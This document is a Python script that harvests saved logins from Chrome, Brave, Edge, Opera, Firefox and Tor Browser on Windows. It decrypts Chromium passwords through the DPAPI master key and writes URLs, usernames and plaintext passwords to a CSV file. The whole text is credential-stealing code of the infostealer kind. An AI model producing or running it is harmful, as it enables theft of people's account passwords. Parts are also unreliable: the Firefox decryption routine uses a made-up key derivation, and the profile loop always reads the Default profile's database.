import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv
import hashlib
import time
from colorama import init

init()

USERPROFILE = os.environ['USERPROFILE']
BROWSER_PATHS = {
    "chrome": os.path.join(USERPROFILE, "AppData\\Local\\Google\\Chrome\\User Data"),
    "brave": os.path.join(USERPROFILE, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
    "edge": os.path.join(USERPROFILE, "AppData\\Local\\Microsoft\\Edge\\User Data"),
    "opera": os.path.join(USERPROFILE, "AppData\\Local\\Opera Software\\Opera Stable"),
    "firefox": os.path.join(USERPROFILE, "AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
    "tor": os.path.join(USERPROFILE, "AppData\\Roaming\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default"),
}

def get_firefox_passwords(profile_path):
    try:
        passwords = []
        key_file = os.path.join(profile_path, 'key4.db')
        logins_file = os.path.join(profile_path, 'logins.json')

        if not os.path.exists(key_file) or not os.path.exists(logins_file):
            return passwords

        with open(logins_file, 'r') as f:
            logins = json.load(f)['logins']

        conn = sqlite3.connect(key_file)
        cursor = conn.cursor()
        cursor.execute("SELECT item1, item2 FROM meta")
        key_data = cursor.fetchall()[0]
        cursor.close()
        conn.close()

        password = key_data[0] + key_data[1]
        encryption_key = hashlib.sha256(password.encode('utf-8')).digest()

        for login in logins:
            url = login['url']
            username = login['username']
            encrypted_password = base64.b64decode(login['encryptedPassword'])
            cipher = AES.new(encryption_key, AES.MODE_CBC, iv=encrypted_password[:16])
            decrypted_password = cipher.decrypt(encrypted_password[16:]).decode('utf-8').strip()
            passwords.append((url, username, decrypted_password))

        return passwords
    except Exception:
        return []

def get_secret_key(browser):
    try:
        local_state_path = os.path.join(BROWSER_PATHS[browser], 'Local State')
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception:
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password).decode('utf-8')
    except Exception:
        return ""

def get_db_connection(browser):
    try:
        db_path = os.path.join(BROWSER_PATHS[browser], 'Default', 'Login Data')
        shutil.copy2(db_path, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception:
        return None

def process_browser_passwords(browser, secret_key, current_user, csv_writer):
    try:
        passwords_saved = False
        if browser in ["chrome", "brave", "edge", "opera"]:
            for folder in os.listdir(BROWSER_PATHS[browser]):
                if re.match(r"^Profile.*|^Default$", folder):
                    db_path = os.path.join(BROWSER_PATHS[browser], folder, "Login Data")
                    conn = get_db_connection(browser)
                    if secret_key and conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index, login in enumerate(cursor.fetchall()):
                            url, username, ciphertext = login
                            if url and username and ciphertext:
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                csv_writer.writerow([index, browser, url, username, decrypted_password, current_user])
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
                        passwords_saved = True

        elif browser in ["firefox", "tor"]:
            profiles = os.listdir(BROWSER_PATHS['firefox'])
            for profile in profiles:
                profile_path = os.path.join(BROWSER_PATHS['firefox'], profile)
                passwords = get_firefox_passwords(profile_path)
                for index, (url, username, decrypted_password) in enumerate(passwords):
                    csv_writer.writerow([index, browser, url, username, decrypted_password, current_user])
                    passwords_saved = True

        if passwords_saved:
            print(f"Successfully saved {browser.capitalize()} passwords.")

    except Exception:
        pass

def extract_passwords():
    try:
        current_user = os.getlogin()
        passwords_dir = "passwords"
        os.makedirs(passwords_dir, exist_ok=True)

        with open(os.path.join(passwords_dir, 'decrypted_password.csv'), mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "browser", "url", "username", "password", "user"])

            browsers = ["chrome", "brave", "edge", "opera", "firefox", "tor"]
            for browser in browsers:
                process_browser_passwords(browser, get_secret_key(browser), current_user, csv_writer)

    except Exception:
        pass

if __name__ == "__main__":
    extract_passwords()
